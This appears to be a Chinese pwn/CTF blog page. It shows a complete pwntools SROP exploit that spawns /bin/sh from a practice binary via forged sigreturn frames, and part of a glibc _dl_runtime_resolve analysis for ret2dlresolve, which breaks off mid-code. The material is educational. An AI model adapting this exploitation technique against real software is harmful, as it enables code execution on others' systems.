<p>和ROP模块一样，可以自动获取程序中的gadgets</p>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">small = ELF(<span class="string">&#x27;./SROP&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./SROP&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">syscall_ret = <span class="number">0x00000000004000BE</span></span><br><span class="line">start_addr = <span class="number">0x00000000004000B0</span></span><br><span class="line">payload = p64(start_addr) * <span class="number">3</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">&#x27;\xb3&#x27;</span>)</span><br><span class="line">stack_addr = u64(sh.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">log.success(<span class="string">&#x27;leak stack addr :&#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line"><span class="comment">#SigreturnFrame模块，触发条件：只要rt_sigreturn的时候栈顶是SigreturnFrame就行</span></span><br><span class="line">sigframe.rax = constants.SYS_read	 	 <span class="comment">#控制rax为‘read’的调用号</span></span><br><span class="line">sigframe.rdi = <span class="number">0</span>				 <span class="comment">#控制各个参数</span></span><br><span class="line">sigframe.rsi = stack_addr			 </span><br><span class="line">sigframe.rdx = <span class="number">0x400</span>				 </span><br><span class="line">sigframe.rsp = stack_addr			 <span class="comment">#控制rsp为stack_addr（栈转移）</span></span><br><span class="line">sigframe.rip = syscall_ret			 <span class="comment">#控制rip为syscall_ret（但只会执行ret）</span></span><br><span class="line">payload = p64(start_addr) + <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + <span class="built_in">str</span>(sigframe)<span class="comment">#构建signal frame（SYS_read）</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sigreturn = p64(syscall_ret) + <span class="string">&#x27;b&#x27;</span> * <span class="number">7</span><span class="comment">#读入15个字符，read控制rax为15</span></span><br><span class="line">sh.send(sigreturn)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">程序在识别到syscall后，首先构建新的栈帧保存上下文，然后调用sys_read在原来的栈空间中写入payload，sys_read执行完成后会ret栈顶的sigreturn，把新构建的栈帧pop出来，接着在程序最后执行的ret会控制IP指向‘start_addr’，然后程序重新执行</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">重复上述操作，在栈空间中压入‘syscall_ret’（因为ret会使rsp+8，所以‘syscall_ret’其实写入了&#x27;aaaaaaaa&#x27;的位置），并在最后一个ret的时候控制IP指向它</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">程序在识别到syscall后，发现rax为15所以执行sigreturn，并且其后正好就是sigframe满足了SigreturnFrame模块的条件（即使sigframe被&#x27;bbbbbbb&#x27;覆盖了一部分也不影响），sigreturn会根据sigframe来设置寄存器的值，控制IP指向syscall_ret，执行sys_read（伪）</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + <span class="number">0x120</span>  </span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = p64(start_addr) + <span class="string">&#x27;c&#x27;</span> * <span class="number">8</span> + <span class="built_in">str</span>(sigframe)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(frame_payload)</span><br><span class="line">payload = frame_payload + (<span class="number">0x120</span> - <span class="built_in">len</span>(frame_payload)) * <span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"><span class="comment">#通过SYS_read在stack_addr+0x120写入&#x27;/bin/sh\x00&#x27;，顺便构建signal frame（SYS_execve）</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(sigreturn)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">在之前的操作中已经更换了寄存器的数据，所以payload会被写入‘stack_addr’，在‘stack_addr’之中构建sigframe并且在‘stack_addr + 0x120’中写入&#x27;/bin/sh\x00&#x27;，在sys_read（伪）结束以后的ret会控制IP指向‘start_addr’</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">重新执行程序后，寄存器&#x27;rax,rdi,rsi,rdx&#x27;被重置，因为‘start_addr’被pop出栈，所以sigreturn会写入&#x27;cccccccc&#x27;的位置，和上文一样了，SigreturnFrame模块的条件满足</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>总结：</p>
<p><strong>SROP</strong>的实现很大程度上依靠SigreturnFrame模块，使用这个模块只需要保证sigreturn执行时的栈顶是SigreturnFrame就可以了</p>
<p>所以需要先构建signal frame，然后再合适的时机调用sigreturn</p>
<p>syscall本身压栈的sigreturn难以被利用，所以我们常常改写“rax”为“15”，以<strong>主动调用</strong>sigreturn，比如：通过read函数的返回值改写“rax”，通过“pop rax”指令来改写“rax”</p>
<p><strong>SROP</strong>也较为灵活，因为可以改写的寄存器很多，栈转移等操作都可以在SROP的附庸中实现</p>
<p>扩展：<a target="_blank" rel="noopener" href="https://2cto.com/article/201512/452080.html">https://2cto.com/article/201512/452080.html</a></p>
<hr>
<h2 id="SROP和传统ROP的对比"><a href="#SROP和传统ROP的对比" class="headerlink" title="SROP和传统ROP的对比"></a>SROP和传统ROP的对比</h2><p><strong>一般ROP</strong></p>
<p>ROP的攻击方式比较普遍，安全防护相应的也比较多 </p>
<p>ROP极大的依赖于栈结构，gadgets片段都是保存在stack上，所以在一次利用结束后，在stack发生改变的时候，很难再次利用 </p>
<p><strong>SROP和攻击</strong></p>
<p>采用SROP进行攻击，需要的gadgets少</p>
<p>每次只需要伪造对应的Frame，sigreturn的调用都能够强制切换到我们需要的状态，有着极高的代码复用性 </p>
<p><strong>两者对比</strong></p>
<p>综合考虑，SROP明显优于ROP，首先SROP是需要利用的gadgets比ROP少，接着就是代码复用性高，只要有syscall随时都可以控制程序执行系统调用，而ROP还需要考虑程序中是否有现成的system函数，如果没有，则需要通过DynELF，LibcSearcher等各种方法到libc中获取system</p>
<p>但SROP的普遍性却不如ROP，SROP需要syscall，如果程序中压根就没有syscall当然就用不了SROP，并且伪造Signal Frame需要相当长的栈空间（至少248字节），如果栈溢出的字节数过少也用不了SROP（SROP的条件非常苛刻）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">dl_runtime_resolve源码分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-12-23 09:52:59" itemprop="dateCreated datePublished" datetime="2021-12-23T09:52:59+08:00">2021-12-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-01-04 16:32:36" itemprop="dateModified" datetime="2022-01-04T16:32:36+08:00">2022-01-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>15k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>14 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="dl-runtime-resolve源码分析"><a href="#dl-runtime-resolve源码分析" class="headerlink" title="dl_runtime_resolve源码分析"></a>dl_runtime_resolve源码分析</h2><p><strong>————深入理解ret2dlresolve</strong></p>
<p><strong>ret2dlresolve</strong>是一种高级的ROP技巧，目前我只是见识了一下题目</p>
<p>于是想通过分析 <strong>_dl_runtime_resolve</strong> 来搞懂 <strong>ret2dlresolve</strong> 的攻击核心点</p>
<hr>
<h2 id="前言-链接器-amp-重定位"><a href="#前言-链接器-amp-重定位" class="headerlink" title="前言-链接器&amp;重定位"></a>前言-链接器&amp;重定位</h2><p>一般C语言程序到机器语言需要经过以下这些步骤：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">预处理 -&gt; 编译 -&gt; 汇编 -&gt; 链接 </span><br></pre></td></tr></table></figure>
<p>C语言代码经过编译以后，并没有生成最终的可执行文件（exe 文件），而是生成了一种叫做<strong>目标文件</strong>（Object File）的中间文件</p>
<p>可重定位目标文件，是<strong>目标文件</strong>的一种，它里面的代码与数据，都是各个文件<strong>独立</strong>的代码与数据 </p>
<p>需要“链接”这个过程使它们建立联系并融合，而“链接”这个过程由链接器来完成</p>
<p><strong>链接：</strong></p>
<p>其实就是一个“打包”的过程，它将所有二进制形式的目标文件和系统组件<strong>组合</strong>成一个可执行文件（各个目标文件就会融合为一个可执行文件）</p>
<p><strong>链接器：</strong></p>
<p>1.符合解析：链接器会将重定位条目中的 <strong>所有引用</strong> 与 <strong>符号表中的符号</strong> 关联起来(这个符号可能在同一个可重定位目标文件中，也可能在其他可重定位目标文件中) </p>
<p>2.文件合并：将所有目标文件的同类型段<strong>合并</strong></p>
<p>3.重定位：当所有目标文件合并完毕后，其各个段的地址都会有<strong>偏移</strong>，数据段和代码段中的<strong>相对地址</strong>都被链接器修正为<strong>最终的内存位置</strong>，这样所有的变量以及函数都确定了其各自位置 </p>
<p>参考：</p>
<p>链接器：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37375427/article/details/84947071">https://blog.csdn.net/qq_37375427/article/details/84947071</a></p>
<p>可重定位目标文件：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45109990/article/details/103397772">https://blog.csdn.net/qq_45109990/article/details/103397772</a></p>
<p>重定位：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000016433947">https://segmentfault.com/a/1190000016433947</a></p>
<hr>
<h2 id="前言-GUN链接器-ld"><a href="#前言-GUN链接器-ld" class="headerlink" title="前言-GUN链接器(ld)"></a>前言-GUN链接器(ld)</h2><p>特点：</p>
<p>解决程序内部跨文件引用的<strong>链接时重定位</strong></p>
<p>引用外部库文件的<strong>装载时重定位</strong>（为了加快加载速度还使用了<strong>延迟绑定</strong>）</p>
<p>链接时重定位（静态链接）：在逻辑地址转换为物理地址的过程中，地址变换是在进程装入时<strong>一次完成</strong>的，以后不再改变 </p>
<p>装载时重定位（动态链接）：动态运行的装入程序把转入模块装入内存之后，并不立即把装入模块的逻辑地址进行转换，而是把这种地址转换<strong>推迟到程序执行时</strong>才进行，装入内存后的所有地址都仍是逻辑地址，这种方式需要寄存器的支持，其中放有当前正在执行的程序在内存空间中的起始地址</p>
<p>参考：</p>
<p>装载时重定位：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/317478523">https://zhuanlan.zhihu.com/p/317478523</a></p>
<p>装载时重定位：<a target="_blank" rel="noopener" href="https://blog.csdn.net/parallelyk/article/details/42747239">https://blog.csdn.net/parallelyk/article/details/42747239</a></p>
<hr>
<h2 id="ELF结构-dynamic-段"><a href="#ELF结构-dynamic-段" class="headerlink" title="ELF结构- dynamic 段"></a>ELF结构- dynamic 段</h2><p>dynamic段是<strong>动态链接</strong>中最重要的段，它记录了和动态链接有关的段的类型，地址或者数值，指向了与动态链接相关的段 </p>
<p>dynamic段包含了以下结构的一个数组：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">Elf32_Sword d_tag;<span class="comment">//如果是64位系统就改为Elf64</span></span><br><span class="line">      <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">          Elf32_Sword d_val;<span class="comment">//那些Elf32_Word object描绘了具有不同解释的整形变量</span></span><br><span class="line">          Elf32_Addr d_ptr;<span class="comment">//那些Elf32_Word object描绘了程序的虚拟地址</span></span><br><span class="line">      &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> Elf32_Dyn _DYNAMIC[];</span><br></pre></td></tr></table></figure>
<p><strong>Elf_Dyn结构体</strong>由一个类型值加上一个附加的数值或指针组成 </p>
<p>对每一个有该类型的object，d_tag控制着d_un的解释</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center"><code>d_tag</code>类型</th>
<th style="text-align:center"><code>d_un</code>的定义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>#define DT_STRTAB 5</code>（0x5）</td>
<td style="text-align:center">动态链接<strong>字符串</strong>表的地址，d_ptr表示<code>.dynstr</code>的地址 (Address of string table)</td>
</tr>
<tr>
<td style="text-align:center"><code>#define DT_SYMTAB 6</code>（0x6）</td>
<td style="text-align:center">动态链接<strong>符号表</strong>的地址，d_ptr表示<code>.dynsym</code>的地址 (Address of symbol table)</td>
</tr>
<tr>
<td style="text-align:center"><code>#define DT_JMPREL 23</code>（0x17）</td>
<td style="text-align:center">动态链接<strong>重定位表</strong>的地址，d_ptr表示<code>.rel.plt</code>的地址 (Address of PLT relocs)</td>
</tr>
<tr>
<td style="text-align:center"><code>#define DT_RELENT 19</code>（0x13）</td>
<td style="text-align:center">单个重定位表项的大小，d_val表示单个重定位表项大小 (Size of one Rel reloc )</td>
</tr>
<tr>
<td style="text-align:center"><code>#define DT_SYMENT 11</code>（0xb）</td>
<td style="text-align:center">单个符号表项的大小，d_val表示单个符号表项大小 (Size of one symbol table entry )</td>
</tr>
</tbody>
</table>
</div>
<p>32位：</p>
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1640187099021-1640267844289.png" class width="1640187099021"> 
<p>64位：</p>
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1640192939551-1640267844289.png" class width="1640192939551"> 
<p>​        //64位和32位有些许不同：32位，DT_RELENT(0x13)；64位，DT_RELAENT(0x9)</p>
<p>现在开始对最为重要的3个表进行介绍：</p>
<p><strong>重定位表(jmprel)</strong> ：位于rel.plt段，有结构体 <strong>Elf_Rel</strong> ，中包含了需要 <strong>重定位的函数</strong> 的信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr  r_offset;	<span class="comment">// 重定位入口的偏移</span></span><br><span class="line">    Elf32_Word  r_info; 	<span class="comment">// 重定位入口的类型（低8位，1字节）</span></span><br><span class="line">	<span class="comment">// 符号在符号表中的下标（高24位，3字节）</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1640276847960.png" class width="1640276847960">  
<p>​        //程序将对got表进行重定位，所以got表首地址就是“重定位入口”</p>
<p><strong>符号表(symtab)</strong> ：位于dynsym段，有结构体 <strong>Elf_Sym</strong> ，用于记录符号的<strong>关键信息</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//表示该成员在字符串表中的下标</span></span><br><span class="line">  Elf32_Addr    st_value; <span class="comment">//将要解析的函数在libc中的偏移地址</span></span><br><span class="line">  Elf32_Word    st_size; <span class="comment">//符号长度</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym;</span><br></pre></td></tr></table></figure>
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1640189548821-1640267844290.png" class width="1640189548821">  
<p><strong>字符串表(strtab)</strong>：位于dynstr段，无结构体，用于存储<strong>存储dysym符号表中的符号</strong></p>
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1640189533816-1640267844290.png" class width="1640189533816"> 
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="http://blog.chinaunix.net/uid-1835494-id-2831799.html">http://blog.chinaunix.net/uid-1835494-id-2831799.html</a></p>
<hr>
<h2 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h2><p>Lazy Binding机制（延迟绑定）：即只有函数被调用时，才会对函数地址进行解析，然后将真实地址写入GOT表中，第二次调用函数时便不再进行加载</p>
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1640190989263-1640267844290.png" class width="1640190989263"> 
<p>程序第一次识别函数“function”时，跳转plt表，然后跳转got表，接着返回plt[0]，执行“lookup”</p>
<p>​        //检查函数“lookup”可以获取“function_libc”并执行，还会把它写入got表</p>
<p>在IDA中打开公共plt表：(plt[0])</p>
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1640155645830-1640267844290.png" class width="1640155645830"> 
<p>push，jmp指令后就是got表地址</p>
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1640155840997-1640267844290.png" class width="1640155840997"> 
<p>现在看上去这里没有东西，这是因为<strong>Lazy Binding</strong>在函数调用时才会进行解析</p>
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1640156356197-1640267844290.png" class width="1640156356197"> 
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1640156368709-1640267844290.png" class width="1640156368709"> 
<p>got表地址中：</p>
<p>got[0]：.dynamic段的起始地址 </p>
<p>got[1]：link_map</p>
<p>got[2]：_dl_runtime_resolve 函数</p>
<p>got[3-n]：剩余的got表</p>
<p>在jmp指令执行后，相当于执行 _dl_runtime_resolve( link_map，reloc_arg ) </p>
<p>注意：在被调用函数 <strong>自己的plt表</strong> 中会push一个值，然后在 <strong>公共plt表</strong> 中又会push一个值</p>
<p>​        //其实<strong>dl_runtime_resolve</strong>就是检查函数“lookup”</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/unr4v31/p/15168342.html">https://www.cnblogs.com/unr4v31/p/15168342.html</a></p>
<hr>
<h2 id="分析dl-runtime-resolve"><a href="#分析dl-runtime-resolve" class="headerlink" title="分析dl_runtime_resolve"></a>分析dl_runtime_resolve</h2><p><strong>_dl_runtime_resolve</strong>用于对动态链接的函数进行<strong>重定位</strong>，是一段<strong>汇编语言</strong></p>
<img src="/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1640154253689-1640267844290.png" class width="1640154253689"> 
<p>1.link_map_obj：结构体link_map，包含了动态装载器加载ELF对象需要的全部信息 </p>
<p>2.reloc_arg：可以找到文件中<code>.rel.plt</code>表 ，标识了解析哪一个导入函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">   .text</span><br><span class="line">    .globl _dl_runtime_resolve</span><br><span class="line">    .type _dl_runtime_resolve, @function</span><br><span class="line">    .align <span class="number">16</span></span><br><span class="line">    cfi_startproc<span class="comment">//所有cfi开头的指令和函数检测有关，即GNU Profiler，这里不关心</span></span><br><span class="line">_dl_runtime_resolve:</span><br><span class="line">    cfi_adjust_cfa_offset(<span class="number">16</span>) </span><br><span class="line">    subq $<span class="number">56</span>,%rsp<span class="comment">//rsp-56(上移7个地址空间)</span></span><br><span class="line">    cfi_adjust_cfa_offset(<span class="number">56</span>)</span><br><span class="line">        <span class="comment">//分别把rax，rcx，rdx，rsi，rdi，r8，r9，装入栈</span></span><br><span class="line">    movq %rax,(%rsp)			<span class="comment">//	rsp+00|rax</span></span><br><span class="line">    movq %rcx, <span class="number">8</span>(%rsp)			<span class="comment">//	rsp+08|rcx</span></span><br><span class="line">    movq %rdx, <span class="number">16</span>(%rsp)			<span class="comment">//	rsp+16|rdx</span></span><br><span class="line">    movq %rsi, <span class="number">24</span>(%rsp)			<span class="comment">//	rsp+24|rsi</span></span><br><span class="line">    movq %rdi, <span class="number">32</span>(%rsp)			<span class="comment">//	rsp+32|rdi</span></span><br><span class="line">    movq %r8, <span class="number">40</span>(%rsp)			<span class="comment">//	rsp+40|r8</span></span><br><span class="line">    movq %r9, <span class="number">48</span>(%rsp)			<span class="comment">//	rsp+48|r9</span></span><br><span class="line">    movq <span class="number">64</span>(%rsp), %rsi<span class="comment">//rsp+64-&gt;rsi(第2个参数：标识了解析哪一个导入函数)</span></span><br><span class="line">    movq <span class="number">56</span>(%rsp), %rdi<span class="comment">//rsp+56-&gt;rdi(第1个参数：获取解析导入函数所需的信息)	</span></span><br><span class="line">    call _dl_fixup<span class="comment">//核心，用于解析导入函数的真实地址</span></span><br><span class="line">        <span class="comment">//把保存在栈上的数据恢复</span></span><br><span class="line">    movq %rax, %r11     </span><br><span class="line">    movq <span class="number">48</span>(%rsp), %r9  </span><br><span class="line">    movq <span class="number">40</span>(%rsp), %r8</span><br><span class="line">    movq <span class="number">32</span>(%rsp), %rdi</span><br><span class="line">    movq <span class="number">24</span>(%rsp), %rsi</span><br><span class="line">    movq <span class="number">16</span>(%rsp), %rdx</span><br><span class="line">    movq <span class="number">8</span>(%rsp), %<span class="function">rcx</span></span><br><span class="line"><span class="function">    <span class="title">movq</span> <span class="params">(%rsp)</span>, %rax</span></span><br><span class="line"><span class="function">    addq $72, %rsp<span class="comment">//rsp+72     </span></span></span><br><span class="line"><span class="function">    <span class="title">cfi_adjust_cfa_offset</span><span class="params">(<span class="number">-72</span>)</span></span></span><br><span class="line"><span class="function">    jmp *%r11       	<span class="comment">// Jump to function address</span></span></span><br><span class="line"><span class="function">    cfi_endproc</span></span><br><span class="line"><span class="function">    .size _dl_runtime_resolve, .-_dl_runtime_resolve</span></span><br></pre></td></tr></table></figure>
<p><strong>_dl_fixup：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ElfW(type)  _ElfW (Elf, __ELF_NATIVE_CLASS, type)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ElfW(e,w,t)    _ElfW_1 (e, w, _##t)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ElfW_1(e,w,t)  e##w##t</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">ElfW(Addr) __attribute ((noinline)) _dl_fixup ( struct link_map *__unbounded l, ElfW(Word) reloc_arg)</span><br><span class="line">    <span class="comment">//ElfW为宏定义，用于根据32位或64位的计算机获取最终的变量</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line">    <span class="comment">//通过参数link_map获取了‘symtab’和‘strtab’</span></span><br><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);						</span><br><span class="line">    <span class="comment">//1.首先通过参数reloc_arg计算：对应的Elf_Rel结构体</span></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    <span class="comment">//2.然后通过reloc-&gt;r_info找到：对应的Elf_Sym结构体</span></span><br><span class="line">  <span class="keyword">void</span> *<span 